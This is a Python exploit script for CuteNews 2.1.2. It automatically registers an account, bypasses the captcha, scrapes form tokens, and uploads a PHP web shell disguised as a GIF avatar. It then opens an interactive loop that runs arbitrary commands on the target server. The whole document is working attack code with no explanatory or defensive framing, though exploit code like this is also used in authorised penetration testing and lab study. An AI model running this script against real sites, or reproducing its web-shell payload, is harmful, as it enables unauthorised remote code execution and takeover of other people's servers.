import argparse
import random
import string
import requests
import re
import sys
from bs4 import BeautifulSoup


def parseargs():
    parser = argparse.ArgumentParser(description='CuteNews 2.1.2 RCE')
    parser.add_argument('url', type=str, help='The url of the target')
    args = parser.parse_args()
    return args


def captcha(sess, url):
    r = sess.get(url + '/captcha.php')
    text = r.content.decode('utf-8')
    clean = re.compile('<.*?>')
    text = re.sub(clean, '', text)
    return text


def register(passed_text, username, sess, url):
    data = {'action': 'register',
            'regusername': username,
            'regnickname': username,
            'regpassword': username,
            'confirm': username,
            'regemail': username + '@foo.com',
            'captcha': passed_text}
    print('> Attempting to register new user with the following username: ' + username)
    sess.post(url + '/index.php', params='register', data=data)


def get_token(sess, url):
    # try-except is used to check user homepage for tokens, which won't exist if account registration fails
    try:
        r = sess.get(url + "/index.php?mod=main&opt=personal")
        soup = BeautifulSoup(r.text, "html.parser")
        signature_key = soup.find("input", attrs={'name': '__signature_key', 'type': 'hidden'})["value"]
        signature_dsi = soup.find("input", attrs={'name': '__signature_dsi', 'type': 'hidden'})["value"]
        return signature_key, signature_dsi
    except TypeError:
        print('> Could not return tokens. Account creation may have failed.\n> Quitting...')
        sys.exit(1)


def upload_file(passed_token, username, sess, url):
    payload = "GIF8;\n<?php system($_GET['cmd']) ?>"
    data = {'mod': 'main',
            'opt': 'personal',
            '__signature_key': passed_token[0],
            '__signature_dsi': passed_token[1],
            'editnickname': username}
    file = {'avatar_file': (username + '.php', payload, 'application/x-php')}
    sess.post(url + '/index.php', data=data, files=file)
    # check if file upload was successful
    r = sess.get(url + '/uploads/avatar_' + username + '_' + username + '.php')
    if r.status_code == 200:
        print('> Avatar uploaded successfully!')
        print('> Example Usage: ' + url + '/uploads/avatar_' + username + '_' + username + '.php?cmd=whoami')
    else:
        print('> Avatar was not uploaded successfully.\n> Quitting...')
        sys.exit(1)


def rce(username, sess, url):
    while True:
        shell = input('> Do you want to launch a shell? (y/n) ').lower()
        if shell == 'y':
            while True:
                cmd = input('cmd $ ')
                if cmd == 'exit':
                    sys.exit(0)
                else:
                    r = sess.get(url + '/uploads/avatar_' + username + '_' + username + '.php?cmd=' + cmd)
                    output = r.text
                    print(output.replace('GIF8;\n', ''))
        elif shell == 'n':
            sys.exit(0)
        else:
            print('invalid input, try again')


def main():
    args = parseargs()
    url = args.url.rstrip("/")
    s = requests.Session()
    username = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))

    text = captcha(s, url)
    register(text, username, s, url)
    token = get_token(s, url)
    upload_file(token, username, s, url)
    rce(username, s, url)


if __name__ == '__main__':
    main()
